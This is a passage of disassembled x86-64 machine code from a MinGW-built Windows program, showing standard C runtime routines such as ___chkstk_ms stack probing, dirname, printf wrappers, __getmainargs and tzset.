  402a73:	44 8b 48 0c          	mov    0xc(%rax),%r9d
  402a77:	4d 01 d9             	add    %r11,%r9
  402a7a:	4c 89 c8             	mov    %r9,%rax
  402a7d:	48 83 c4 28          	add    $0x28,%rsp
  402a81:	c3                   	ret
  402a82:	90                   	nop
  402a83:	90                   	nop
  402a84:	90                   	nop
  402a85:	90                   	nop
  402a86:	90                   	nop
  402a87:	90                   	nop
  402a88:	90                   	nop
  402a89:	90                   	nop
  402a8a:	90                   	nop
  402a8b:	90                   	nop
  402a8c:	90                   	nop
  402a8d:	90                   	nop
  402a8e:	90                   	nop
  402a8f:	90                   	nop

0000000000402a90 <___chkstk_ms>:
  402a90:	51                   	push   %rcx
  402a91:	50                   	push   %rax
  402a92:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
  402a98:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
  402a9d:	72 19                	jb     402ab8 <___chkstk_ms+0x28>
  402a9f:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
  402aa6:	48 83 09 00          	orq    $0x0,(%rcx)
  402aaa:	48 2d 00 10 00 00    	sub    $0x1000,%rax
  402ab0:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
  402ab6:	77 e7                	ja     402a9f <___chkstk_ms+0xf>
  402ab8:	48 29 c1             	sub    %rax,%rcx
  402abb:	48 83 09 00          	orq    $0x0,(%rcx)
  402abf:	58                   	pop    %rax
  402ac0:	59                   	pop    %rcx
  402ac1:	c3                   	ret
  402ac2:	90                   	nop
  402ac3:	90                   	nop
  402ac4:	90                   	nop
  402ac5:	90                   	nop
  402ac6:	90                   	nop
  402ac7:	90                   	nop
  402ac8:	90                   	nop
  402ac9:	90                   	nop
  402aca:	90                   	nop
  402acb:	90                   	nop
  402acc:	90                   	nop
  402acd:	90                   	nop
  402ace:	90                   	nop
  402acf:	90                   	nop

0000000000402ad0 <dirname>:
  402ad0:	55                   	push   %rbp
  402ad1:	41 56                	push   %r14
  402ad3:	41 55                	push   %r13
  402ad5:	41 54                	push   %r12
  402ad7:	56                   	push   %rsi
  402ad8:	53                   	push   %rbx
  402ad9:	48 83 ec 28          	sub    $0x28,%rsp
  402add:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
  402ae4:	00 
  402ae5:	31 d2                	xor    %edx,%edx
  402ae7:	49 89 cd             	mov    %rcx,%r13
  402aea:	b9 02 00 00 00       	mov    $0x2,%ecx
  402aef:	e8 2c 07 00 00       	call   403220 <setlocale>
  402af4:	49 89 c4             	mov    %rax,%r12
  402af7:	48 85 c0             	test   %rax,%rax
  402afa:	74 0b                	je     402b07 <dirname+0x37>
  402afc:	48 89 c1             	mov    %rax,%rcx
  402aff:	e8 3c 06 00 00       	call   403140 <strdup>
  402b04:	49 89 c4             	mov    %rax,%r12
  402b07:	48 8d 15 a2 28 00 00 	lea    0x28a2(%rip),%rdx        # 4053b0 <_tls_used+0x2f0>
  402b0e:	b9 02 00 00 00       	mov    $0x2,%ecx
  402b13:	e8 08 07 00 00       	call   403220 <setlocale>
  402b18:	4d 85 ed             	test   %r13,%r13
  402b1b:	74 07                	je     402b24 <dirname+0x54>
  402b1d:	41 80 7d 00 00       	cmpb   $0x0,0x0(%r13)
  402b22:	75 6c                	jne    402b90 <dirname+0xc0>
  402b24:	45 31 c0             	xor    %r8d,%r8d
  402b27:	48 8d 15 84 28 00 00 	lea    0x2884(%rip),%rdx        # 4053b2 <_tls_used+0x2f2>
  402b2e:	31 c9                	xor    %ecx,%ecx
  402b30:	e8 43 07 00 00       	call   403278 <wcstombs>
  402b35:	48 8b 0d 14 5e 00 00 	mov    0x5e14(%rip),%rcx        # 408950 <__mingw_oldexcpt_handler+0x310>
  402b3c:	48 8d 58 01          	lea    0x1(%rax),%rbx
  402b40:	48 89 da             	mov    %rbx,%rdx
  402b43:	e8 08 07 00 00       	call   403250 <realloc>
  402b48:	49 89 d8             	mov    %rbx,%r8
  402b4b:	48 8d 15 60 28 00 00 	lea    0x2860(%rip),%rdx        # 4053b2 <_tls_used+0x2f2>
  402b52:	48 89 c1             	mov    %rax,%rcx
  402b55:	48 89 05 f4 5d 00 00 	mov    %rax,0x5df4(%rip)        # 408950 <__mingw_oldexcpt_handler+0x310>
  402b5c:	e8 17 07 00 00       	call   403278 <wcstombs>
  402b61:	4c 89 e2             	mov    %r12,%rdx
  402b64:	b9 02 00 00 00       	mov    $0x2,%ecx
  402b69:	e8 b2 06 00 00       	call   403220 <setlocale>
  402b6e:	4c 89 e1             	mov    %r12,%rcx
  402b71:	e8 ca 06 00 00       	call   403240 <free>
  402b76:	4c 8b 2d d3 5d 00 00 	mov    0x5dd3(%rip),%r13        # 408950 <__mingw_oldexcpt_handler+0x310>
  402b7d:	4c 89 e8             	mov    %r13,%rax
  402b80:	48 8d 65 a8          	lea    -0x58(%rbp),%rsp
  402b84:	5b                   	pop    %rbx
  402b85:	5e                   	pop    %rsi
  402b86:	41 5c                	pop    %r12
  402b88:	41 5d                	pop    %r13
  402b8a:	41 5e                	pop    %r14
  402b8c:	5d                   	pop    %rbp
  402b8d:	c3                   	ret
  402b8e:	66 90                	xchg   %ax,%ax
  402b90:	45 31 c0             	xor    %r8d,%r8d
  402b93:	4c 89 ea             	mov    %r13,%rdx
  402b96:	31 c9                	xor    %ecx,%ecx
  402b98:	48 89 e6             	mov    %rsp,%rsi
  402b9b:	e8 d0 06 00 00       	call   403270 <mbstowcs>
  402ba0:	49 89 c0             	mov    %rax,%r8
  402ba3:	48 8d 44 00 11       	lea    0x11(%rax,%rax,1),%rax
  402ba8:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
  402bac:	e8 df fe ff ff       	call   402a90 <___chkstk_ms>
  402bb1:	31 db                	xor    %ebx,%ebx
  402bb3:	48 29 c4             	sub    %rax,%rsp
  402bb6:	4c 89 ea             	mov    %r13,%rdx
  402bb9:	4c 8d 74 24 20       	lea    0x20(%rsp),%r14
  402bbe:	4c 89 f1             	mov    %r14,%rcx
  402bc1:	e8 aa 06 00 00       	call   403270 <mbstowcs>
  402bc6:	49 89 c0             	mov    %rax,%r8
  402bc9:	66 41 89 1c 46       	mov    %bx,(%r14,%rax,2)
  402bce:	4c 89 f0             	mov    %r14,%rax
  402bd1:	45 0f b7 1e          	movzwl (%r14),%r11d
  402bd5:	49 83 f8 01          	cmp    $0x1,%r8
  402bd9:	76 25                	jbe    402c00 <dirname+0x130>
  402bdb:	41 0f b7 56 02       	movzwl 0x2(%r14),%edx
  402be0:	66 41 83 fb 2f       	cmp    $0x2f,%r11w
  402be5:	0f 84 e5 01 00 00    	je     402dd0 <dirname+0x300>
  402beb:	66 41 83 fb 5c       	cmp    $0x5c,%r11w
  402bf0:	0f 84 da 01 00 00    	je     402dd0 <dirname+0x300>
  402bf6:	66 83 fa 3a          	cmp    $0x3a,%dx
  402bfa:	0f 84 f0 01 00 00    	je     402df0 <dirname+0x320>
  402c00:	66 45 85 db          	test   %r11w,%r11w
  402c04:	75 0a                	jne    402c10 <dirname+0x140>
  402c06:	48 89 f4             	mov    %rsi,%rsp
  402c09:	e9 16 ff ff ff       	jmp    402b24 <dirname+0x54>
  402c0e:	66 90                	xchg   %ax,%ax
  402c10:	49 89 c1             	mov    %rax,%r9
  402c13:	48 89 c2             	mov    %rax,%rdx
  402c16:	44 89 d9             	mov    %r11d,%ecx
  402c19:	eb 1c                	jmp    402c37 <dirname+0x167>
  402c1b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  402c20:	49 89 d2             	mov    %rdx,%r10
  402c23:	66 83 f9 5c          	cmp    $0x5c,%cx
  402c27:	74 2b                	je     402c54 <dirname+0x184>
  402c29:	41 0f b7 4a 02       	movzwl 0x2(%r10),%ecx
  402c2e:	48 83 c2 02          	add    $0x2,%rdx
  402c32:	66 85 c9             	test   %cx,%cx
  402c35:	74 39                	je     402c70 <dirname+0x1a0>
  402c37:	66 83 f9 2f          	cmp    $0x2f,%cx
  402c3b:	75 e3                	jne    402c20 <dirname+0x150>
  402c3d:	0f b7 0a             	movzwl (%rdx),%ecx
  402c40:	66 83 f9 2f          	cmp    $0x2f,%cx
  402c44:	75 17                	jne    402c5d <dirname+0x18d>
  402c46:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  402c4d:	00 00 00 
  402c50:	48 83 c2 02          	add    $0x2,%rdx
  402c54:	0f b7 0a             	movzwl (%rdx),%ecx
  402c57:	66 83 f9 2f          	cmp    $0x2f,%cx
  402c5b:	74 f3                	je     402c50 <dirname+0x180>
  402c5d:	66 83 f9 5c          	cmp    $0x5c,%cx
  402c61:	74 ed                	je     402c50 <dirname+0x180>
  402c63:	49 89 d2             	mov    %rdx,%r10
  402c66:	66 85 c9             	test   %cx,%cx
  402c69:	74 05                	je     402c70 <dirname+0x1a0>
  402c6b:	49 89 d1             	mov    %rdx,%r9
  402c6e:	eb b9                	jmp    402c29 <dirname+0x159>
  402c70:	4c 39 c8             	cmp    %r9,%rax
  402c73:	72 7b                	jb     402cf0 <dirname+0x220>
  402c75:	66 41 83 fb 2f       	cmp    $0x2f,%r11w
  402c7a:	74 0f                	je     402c8b <dirname+0x1bb>
  402c7c:	66 41 83 fb 5c       	cmp    $0x5c,%r11w
  402c81:	74 08                	je     402c8b <dirname+0x1bb>
  402c83:	b9 2e 00 00 00       	mov    $0x2e,%ecx
  402c88:	66 89 08             	mov    %cx,(%rax)
  402c8b:	31 d2                	xor    %edx,%edx
  402c8d:	45 31 c0             	xor    %r8d,%r8d
  402c90:	31 c9                	xor    %ecx,%ecx
  402c92:	66 89 50 02          	mov    %dx,0x2(%rax)
  402c96:	4c 89 f2             	mov    %r14,%rdx
  402c99:	e8 da 05 00 00       	call   403278 <wcstombs>
  402c9e:	48 8b 0d ab 5c 00 00 	mov    0x5cab(%rip),%rcx        # 408950 <__mingw_oldexcpt_handler+0x310>
  402ca5:	48 8d 58 01          	lea    0x1(%rax),%rbx
  402ca9:	48 89 da             	mov    %rbx,%rdx
  402cac:	e8 9f 05 00 00       	call   403250 <realloc>
  402cb1:	49 89 d8             	mov    %rbx,%r8
  402cb4:	4c 89 f2             	mov    %r14,%rdx
  402cb7:	48 89 c1             	mov    %rax,%rcx
  402cba:	48 89 05 8f 5c 00 00 	mov    %rax,0x5c8f(%rip)        # 408950 <__mingw_oldexcpt_handler+0x310>
  402cc1:	49 89 c5             	mov    %rax,%r13
  402cc4:	e8 af 05 00 00       	call   403278 <wcstombs>
  402cc9:	4c 89 e2             	mov    %r12,%rdx
  402ccc:	b9 02 00 00 00       	mov    $0x2,%ecx
  402cd1:	e8 4a 05 00 00       	call   403220 <setlocale>
  402cd6:	4c 89 e1             	mov    %r12,%rcx
  402cd9:	e8 62 05 00 00       	call   403240 <free>
  402cde:	48 89 f4             	mov    %rsi,%rsp
  402ce1:	e9 97 fe ff ff       	jmp    402b7d <dirname+0xad>
  402ce6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  402ced:	00 00 00 
  402cf0:	4c 89 ca             	mov    %r9,%rdx
  402cf3:	49 83 e9 02          	sub    $0x2,%r9
  402cf7:	4c 39 c8             	cmp    %r9,%rax
  402cfa:	0f 83 2f 01 00 00    	jae    402e2f <dirname+0x35f>
  402d00:	41 0f b7 11          	movzwl (%r9),%edx
  402d04:	66 83 fa 2f          	cmp    $0x2f,%dx
  402d08:	74 e6                	je     402cf0 <dirname+0x220>
  402d0a:	66 83 fa 5c          	cmp    $0x5c,%dx
  402d0e:	74 e0                	je     402cf0 <dirname+0x220>
  402d10:	45 31 db             	xor    %r11d,%r11d
  402d13:	66 45 89 59 02       	mov    %r11w,0x2(%r9)
  402d18:	41 0f b7 16          	movzwl (%r14),%edx
  402d1c:	4d 89 f1             	mov    %r14,%r9
  402d1f:	66 83 fa 2f          	cmp    $0x2f,%dx
  402d23:	74 0b                	je     402d30 <dirname+0x260>
  402d25:	66 83 fa 5c          	cmp    $0x5c,%dx
  402d29:	0f 85 41 01 00 00    	jne    402e70 <dirname+0x3a0>
  402d2f:	90                   	nop
  402d30:	41 0f b7 41 02       	movzwl 0x2(%r9),%eax
  402d35:	49 83 c1 02          	add    $0x2,%r9
  402d39:	66 83 f8 2f          	cmp    $0x2f,%ax
  402d3d:	74 f1                	je     402d30 <dirname+0x260>
  402d3f:	66 83 f8 5c          	cmp    $0x5c,%ax
  402d43:	74 eb                	je     402d30 <dirname+0x260>
  402d45:	4c 89 c8             	mov    %r9,%rax
  402d48:	4c 29 f0             	sub    %r14,%rax
  402d4b:	48 83 f8 04          	cmp    $0x4,%rax
  402d4f:	0f 8e 1b 01 00 00    	jle    402e70 <dirname+0x3a0>
  402d55:	4d 89 f1             	mov    %r14,%r9
  402d58:	66 85 d2             	test   %dx,%dx
  402d5b:	0f 84 a7 00 00 00    	je     402e08 <dirname+0x338>
  402d61:	4c 89 c9             	mov    %r9,%rcx
  402d64:	eb 26                	jmp    402d8c <dirname+0x2bc>
  402d66:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  402d6d:	00 00 00 
  402d70:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
  402d74:	4c 8d 51 02          	lea    0x2(%rcx),%r10
  402d78:	66 83 fa 5c          	cmp    $0x5c,%dx
  402d7c:	0f 84 7e 00 00 00    	je     402e00 <dirname+0x330>
  402d82:	89 c2                	mov    %eax,%edx
  402d84:	4c 89 d1             	mov    %r10,%rcx
  402d87:	66 85 d2             	test   %dx,%dx
  402d8a:	74 7c                	je     402e08 <dirname+0x338>
  402d8c:	49 83 c1 02          	add    $0x2,%r9
  402d90:	66 41 89 51 fe       	mov    %dx,-0x2(%r9)
  402d95:	66 83 fa 2f          	cmp    $0x2f,%dx
  402d99:	75 d5                	jne    402d70 <dirname+0x2a0>
  402d9b:	0f b7 01             	movzwl (%rcx),%eax
  402d9e:	66 83 f8 5c          	cmp    $0x5c,%ax
  402da2:	74 0c                	je     402db0 <dirname+0x2e0>
  402da4:	89 c2                	mov    %eax,%edx
  402da6:	66 83 f8 2f          	cmp    $0x2f,%ax
  402daa:	75 db                	jne    402d87 <dirname+0x2b7>
  402dac:	0f 1f 40 00          	nopl   0x0(%rax)
  402db0:	0f b7 51 02          	movzwl 0x2(%rcx),%edx
  402db4:	48 83 c1 02          	add    $0x2,%rcx
  402db8:	66 83 fa 2f          	cmp    $0x2f,%dx
  402dbc:	74 f2                	je     402db0 <dirname+0x2e0>
  402dbe:	66 83 fa 5c          	cmp    $0x5c,%dx
  402dc2:	74 ec                	je     402db0 <dirname+0x2e0>
  402dc4:	eb c1                	jmp    402d87 <dirname+0x2b7>
  402dc6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  402dcd:	00 00 00 
  402dd0:	66 41 39 d3          	cmp    %dx,%r11w
  402dd4:	0f 85 26 fe ff ff    	jne    402c00 <dirname+0x130>
  402dda:	66 41 83 7e 04 00    	cmpw   $0x0,0x4(%r14)
  402de0:	0f 85 1a fe ff ff    	jne    402c00 <dirname+0x130>
  402de6:	e9 de fe ff ff       	jmp    402cc9 <dirname+0x1f9>
  402deb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  402df0:	45 0f b7 5e 04       	movzwl 0x4(%r14),%r11d
  402df5:	49 8d 46 04          	lea    0x4(%r14),%rax
  402df9:	e9 02 fe ff ff       	jmp    402c00 <dirname+0x130>
  402dfe:	66 90                	xchg   %ax,%ax
  402e00:	4c 89 d1             	mov    %r10,%rcx
  402e03:	eb 99                	jmp    402d9e <dirname+0x2ce>
  402e05:	0f 1f 00             	nopl   (%rax)
  402e08:	45 31 d2             	xor    %r10d,%r10d
  402e0b:	4c 89 f2             	mov    %r14,%rdx
  402e0e:	4c 89 e9             	mov    %r13,%rcx
  402e11:	66 45 89 11          	mov    %r10w,(%r9)
  402e15:	e8 5e 04 00 00       	call   403278 <wcstombs>
  402e1a:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
  402e1e:	0f 84 a5 fe ff ff    	je     402cc9 <dirname+0x1f9>
  402e24:	41 c6 44 05 00 00    	movb   $0x0,0x0(%r13,%rax,1)
  402e2a:	e9 9a fe ff ff       	jmp    402cc9 <dirname+0x1f9>
  402e2f:	0f 85 db fe ff ff    	jne    402d10 <dirname+0x240>
  402e35:	66 41 83 fb 2f       	cmp    $0x2f,%r11w
  402e3a:	74 0b                	je     402e47 <dirname+0x377>
  402e3c:	66 41 83 fb 5c       	cmp    $0x5c,%r11w
  402e41:	0f 85 c9 fe ff ff    	jne    402d10 <dirname+0x240>
  402e47:	66 45 39 59 02       	cmp    %r11w,0x2(%r9)
  402e4c:	0f 85 be fe ff ff    	jne    402d10 <dirname+0x240>
  402e52:	41 0f b7 41 04       	movzwl 0x4(%r9),%eax
  402e57:	66 83 f8 2f          	cmp    $0x2f,%ax
  402e5b:	0f 84 af fe ff ff    	je     402d10 <dirname+0x240>
  402e61:	66 83 f8 5c          	cmp    $0x5c,%ax
  402e65:	4c 0f 45 ca          	cmovne %rdx,%r9
  402e69:	e9 a2 fe ff ff       	jmp    402d10 <dirname+0x240>
  402e6e:	66 90                	xchg   %ax,%ax
  402e70:	66 41 39 56 02       	cmp    %dx,0x2(%r14)
  402e75:	0f 85 da fe ff ff    	jne    402d55 <dirname+0x285>
  402e7b:	41 0f b7 11          	movzwl (%r9),%edx
  402e7f:	e9 d4 fe ff ff       	jmp    402d58 <dirname+0x288>
  402e84:	90                   	nop
  402e85:	90                   	nop
  402e86:	90                   	nop
  402e87:	90                   	nop
  402e88:	90                   	nop
  402e89:	90                   	nop
  402e8a:	90                   	nop
  402e8b:	90                   	nop
  402e8c:	90                   	nop
  402e8d:	90                   	nop
  402e8e:	90                   	nop
  402e8f:	90                   	nop

0000000000402e90 <vfprintf>:
  402e90:	48 83 ec 38          	sub    $0x38,%rsp
  402e94:	45 31 c9             	xor    %r9d,%r9d
  402e97:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
  402e9c:	49 89 d0             	mov    %rdx,%r8
  402e9f:	48 89 ca             	mov    %rcx,%rdx
  402ea2:	31 c9                	xor    %ecx,%ecx
  402ea4:	e8 b7 02 00 00       	call   403160 <__stdio_common_vfprintf>
  402ea9:	48 83 c4 38          	add    $0x38,%rsp
  402ead:	c3                   	ret
  402eae:	90                   	nop
  402eaf:	90                   	nop

0000000000402eb0 <snprintf>:
  402eb0:	48 83 ec 48          	sub    $0x48,%rsp
  402eb4:	48 8d 44 24 68       	lea    0x68(%rsp),%rax
  402eb9:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
  402ebe:	4d 89 c1             	mov    %r8,%r9
  402ec1:	49 89 d0             	mov    %rdx,%r8
  402ec4:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  402ec9:	48 89 ca             	mov    %rcx,%rdx
  402ecc:	b9 02 00 00 00       	mov    $0x2,%ecx
  402ed1:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  402ed8:	00 00 
  402eda:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
  402edf:	e8 8c 02 00 00       	call   403170 <__stdio_common_vsprintf>
  402ee4:	48 83 c4 48          	add    $0x48,%rsp
  402ee8:	c3                   	ret
  402ee9:	90                   	nop
  402eea:	90                   	nop
  402eeb:	90                   	nop
  402eec:	90                   	nop
  402eed:	90                   	nop
  402eee:	90                   	nop
  402eef:	90                   	nop

0000000000402ef0 <fprintf>:
  402ef0:	48 83 ec 48          	sub    $0x48,%rsp
  402ef4:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
  402ef9:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
  402efe:	49 89 d0             	mov    %rdx,%r8
  402f01:	48 89 ca             	mov    %rcx,%rdx
  402f04:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  402f09:	31 c9                	xor    %ecx,%ecx
  402f0b:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
  402f10:	45 31 c9             	xor    %r9d,%r9d
  402f13:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
  402f18:	e8 43 02 00 00       	call   403160 <__stdio_common_vfprintf>
  402f1d:	48 83 c4 48          	add    $0x48,%rsp
  402f21:	c3                   	ret
  402f22:	90                   	nop
  402f23:	90                   	nop
  402f24:	90                   	nop
  402f25:	90                   	nop
  402f26:	90                   	nop
  402f27:	90                   	nop
  402f28:	90                   	nop
  402f29:	90                   	nop
  402f2a:	90                   	nop
  402f2b:	90                   	nop
  402f2c:	90                   	nop
  402f2d:	90                   	nop
  402f2e:	90                   	nop
  402f2f:	90                   	nop

0000000000402f30 <_get_output_format>:
  402f30:	31 c0                	xor    %eax,%eax
  402f32:	c3                   	ret
  402f33:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  402f3a:	00 00 00 00 
  402f3e:	66 90                	xchg   %ax,%ax

0000000000402f40 <__getmainargs>:
  402f40:	41 54                	push   %r12
  402f42:	55                   	push   %rbp
  402f43:	57                   	push   %rdi
  402f44:	56                   	push   %rsi
  402f45:	53                   	push   %rbx
  402f46:	48 83 ec 20          	sub    $0x20,%rsp
  402f4a:	4c 8b 64 24 70       	mov    0x70(%rsp),%r12
  402f4f:	44 89 cd             	mov    %r9d,%ebp
  402f52:	48 89 d6             	mov    %rdx,%rsi
  402f55:	4c 89 c3             	mov    %r8,%rbx
  402f58:	48 89 cf             	mov    %rcx,%rdi
  402f5b:	e8 68 02 00 00       	call   4031c8 <_initialize_narrow_environment>
  402f60:	31 c9                	xor    %ecx,%ecx
  402f62:	85 ed                	test   %ebp,%ebp
  402f64:	0f 95 c1             	setne  %cl
  402f67:	83 c1 01             	add    $0x1,%ecx
  402f6a:	e8 41 02 00 00       	call   4031b0 <_configure_narrow_argv>
  402f6f:	e8 14 02 00 00       	call   403188 <__p___argc>
  402f74:	8b 00                	mov    (%rax),%eax
  402f76:	89 07                	mov    %eax,(%rdi)
  402f78:	e8 13 02 00 00       	call   403190 <__p___argv>
  402f7d:	48 8b 00             	mov    (%rax),%rax
  402f80:	48 89 06             	mov    %rax,(%rsi)
  402f83:	e8 d8 02 00 00       	call   403260 <__p__environ>
  402f88:	48 8b 00             	mov    (%rax),%rax
  402f8b:	48 89 03             	mov    %rax,(%rbx)
  402f8e:	4d 85 e4             	test   %r12,%r12
  402f91:	74 09                	je     402f9c <__getmainargs+0x5c>
  402f93:	41 8b 0c 24          	mov    (%r12),%ecx
  402f97:	e8 94 02 00 00       	call   403230 <_set_new_mode>
  402f9c:	31 c0                	xor    %eax,%eax
  402f9e:	48 83 c4 20          	add    $0x20,%rsp
  402fa2:	5b                   	pop    %rbx
  402fa3:	5e                   	pop    %rsi
  402fa4:	5f                   	pop    %rdi
  402fa5:	5d                   	pop    %rbp
  402fa6:	41 5c                	pop    %r12
  402fa8:	c3                   	ret
  402fa9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000402fb0 <__wgetmainargs>:
  402fb0:	41 54                	push   %r12
  402fb2:	55                   	push   %rbp
  402fb3:	57                   	push   %rdi
  402fb4:	56                   	push   %rsi
  402fb5:	53                   	push   %rbx
  402fb6:	48 83 ec 20          	sub    $0x20,%rsp
  402fba:	4c 8b 64 24 70       	mov    0x70(%rsp),%r12
  402fbf:	44 89 cd             	mov    %r9d,%ebp
  402fc2:	48 89 d6             	mov    %rdx,%rsi
  402fc5:	4c 89 c3             	mov    %r8,%rbx
  402fc8:	48 89 cf             	mov    %rcx,%rdi
  402fcb:	e8 00 02 00 00       	call   4031d0 <_initialize_wide_environment>
  402fd0:	31 c9                	xor    %ecx,%ecx
  402fd2:	85 ed                	test   %ebp,%ebp
  402fd4:	0f 95 c1             	setne  %cl
  402fd7:	83 c1 01             	add    $0x1,%ecx
  402fda:	e8 d9 01 00 00       	call   4031b8 <_configure_wide_argv>
  402fdf:	e8 a4 01 00 00       	call   403188 <__p___argc>
  402fe4:	8b 00                	mov    (%rax),%eax
  402fe6:	89 07                	mov    %eax,(%rdi)
  402fe8:	e8 ab 01 00 00       	call   403198 <__p___wargv>
  402fed:	48 8b 00             	mov    (%rax),%rax
  402ff0:	48 89 06             	mov    %rax,(%rsi)
  402ff3:	e8 70 02 00 00       	call   403268 <__p__wenviron>
  402ff8:	48 8b 00             	mov    (%rax),%rax
  402ffb:	48 89 03             	mov    %rax,(%rbx)
  402ffe:	4d 85 e4             	test   %r12,%r12
  403001:	74 09                	je     40300c <__wgetmainargs+0x5c>
  403003:	41 8b 0c 24          	mov    (%r12),%ecx
  403007:	e8 24 02 00 00       	call   403230 <_set_new_mode>
  40300c:	31 c0                	xor    %eax,%eax
  40300e:	48 83 c4 20          	add    $0x20,%rsp
  403012:	5b                   	pop    %rbx
  403013:	5e                   	pop    %rsi
  403014:	5f                   	pop    %rdi
  403015:	5d                   	pop    %rbp
  403016:	41 5c                	pop    %r12
  403018:	c3                   	ret
  403019:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000403020 <_onexit>:
  403020:	41 54                	push   %r12
  403022:	48 83 ec 20          	sub    $0x20,%rsp
  403026:	49 89 cc             	mov    %rcx,%r12
  403029:	e8 92 01 00 00       	call   4031c0 <_crt_atexit>
  40302e:	85 c0                	test   %eax,%eax
  403030:	b8 00 00 00 00       	mov    $0x0,%eax
  403035:	4c 0f 45 e0          	cmovne %rax,%r12
  403039:	4c 89 e0             	mov    %r12,%rax
  40303c:	48 83 c4 20          	add    $0x20,%rsp
  403040:	41 5c                	pop    %r12
  403042:	c3                   	ret
  403043:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  40304a:	00 00 00 00 
  40304e:	66 90                	xchg   %ax,%ax

0000000000403050 <_amsg_exit>:
  403050:	53                   	push   %rbx
  403051:	48 83 ec 20          	sub    $0x20,%rsp
  403055:	89 cb                	mov    %ecx,%ebx
  403057:	b9 02 00 00 00       	mov    $0x2,%ecx
  40305c:	e8 ef 00 00 00       	call   403150 <__acrt_iob_func>
  403061:	41 89 d8             	mov    %ebx,%r8d
  403064:	48 8d 15 55 23 00 00 	lea    0x2355(%rip),%rdx        # 4053c0 <_tls_used+0x300>
  40306b:	48 89 c1             	mov    %rax,%rcx
  40306e:	48 83 c4 20          	add    $0x20,%rsp
  403072:	5b                   	pop    %rbx
  403073:	e9 78 fe ff ff       	jmp    402ef0 <fprintf>
  403078:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40307f:	00 

0000000000403080 <__ms_fwprintf>:
  403080:	48 83 ec 48          	sub    $0x48,%rsp
  403084:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
  403089:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
  40308e:	49 89 d0             	mov    %rdx,%r8
  403091:	48 89 ca             	mov    %rcx,%rdx
  403094:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  403099:	b9 04 00 00 00       	mov    $0x4,%ecx
  40309e:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
  4030a3:	45 31 c9             	xor    %r9d,%r9d
  4030a6:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
  4030ab:	e8 b8 00 00 00       	call   403168 <__stdio_common_vfwprintf>
  4030b0:	48 83 c4 48          	add    $0x48,%rsp
  4030b4:	c3                   	ret
  4030b5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  4030bc:	00 00 00 00 

00000000004030c0 <_tzset>:
  4030c0:	48 83 ec 28          	sub    $0x28,%rsp
  4030c4:	48 8b 05 95 23 00 00 	mov    0x2395(%rip),%rax        # 405460 <.refptr.__imp__tzset>
  4030cb:	ff 10                	call   *(%rax)
  4030cd:	e8 4e 00 00 00       	call   403120 <__tzname>
  4030d2:	48 89 05 f7 0f 00 00 	mov    %rax,0xff7(%rip)        # 4040d0 <__imp_tzname>
  4030d9:	e8 3a 00 00 00       	call   403118 <__timezone>
  4030de:	48 89 05 e3 0f 00 00 	mov    %rax,0xfe3(%rip)        # 4040c8 <__imp_timezone>
  4030e5:	e8 26 00 00 00       	call   403110 <__daylight>
  4030ea:	48 89 05 cf 0f 00 00 	mov    %rax,0xfcf(%rip)        # 4040c0 <__imp_daylight>
  4030f1:	48 83 c4 28          	add    $0x28,%rsp
  4030f5:	c3                   	ret
  4030f6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  4030fd:	00 00 00 

0000000000403100 <tzset>:
  403100:	eb be                	jmp    4030c0 <_tzset>
  403102:	90                   	nop
  403103:	90                   	nop
  403104:	90                   	nop
  403105:	90                   	nop
  403106:	90                   	nop
  403107:	90                   	nop
  403108:	90                   	nop
  403109:	90                   	nop
  40310a:	90                   	nop
  40310b:	90                   	nop
  40310c:	90                   	nop
  40310d:	90                   	nop
  40310e:	90                   	nop
  40310f:	90                   	nop

0000000000403110 <__daylight>:
  403110:	ff 25 f6 64 00 00    	jmp    *0x64f6(%rip)        # 40960c <__imp___daylight>
  403116:	90                   	nop
  403117:	90                   	nop

0000000000403118 <__timezone>:
  403118:	ff 25 f6 64 00 00    	jmp    *0x64f6(%rip)        # 409614 <__imp___timezone>
  40311e:	90                   	nop
  40311f:	90                   	nop

0000000000403120 <__tzname>:
  403120:	ff 25 f6 64 00 00    	jmp    *0x64f6(%rip)        # 40961c <__imp___tzname>
  403126:	90                   	nop
  403127:	90                   	nop
  403128:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40312f:	00 

0000000000403130 <strlen>:
  403130:	ff 25 b6 64 00 00    	jmp    *0x64b6(%rip)        # 4095ec <__imp_strlen>
  403136:	90                   	nop
  403137:	90                   	nop

0000000000403138 <strncmp>:
